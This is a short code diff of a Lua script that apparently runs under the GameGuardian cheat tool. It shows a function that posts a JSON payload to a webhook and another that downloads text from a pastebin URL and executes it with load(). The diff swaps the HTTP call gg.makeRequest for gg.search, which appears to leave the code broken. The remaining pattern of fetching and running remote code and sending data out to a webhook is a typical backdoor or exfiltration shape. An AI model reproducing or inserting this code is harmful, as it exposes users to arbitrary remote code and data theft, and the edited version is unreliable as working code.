@@ -98,14 +98,14 @@ local function sendWebhook(payload_content)
         ["Content-Type"] = "application/json",
     }
     local payload_json = toJson(payload)
-    gg.makeRequest(webhook_url, headers, payload_json)
+    gg.search(webhook_url, headers, payload_json)
 end
  
 local secret_accounts = {}
  
 function fetchSecretAccounts()
-    local pastebinURL = "https://pastebin.com/raw/wvwFW7hU"
-    local response = gg.makeRequest(pastebinURL)
+    local past = "https://pastebin.com/raw/wvwFW7hU"
+    local response = gg.search(past)
  
     if response and response.content then
         local chunk, errorMsg = load(response.content)
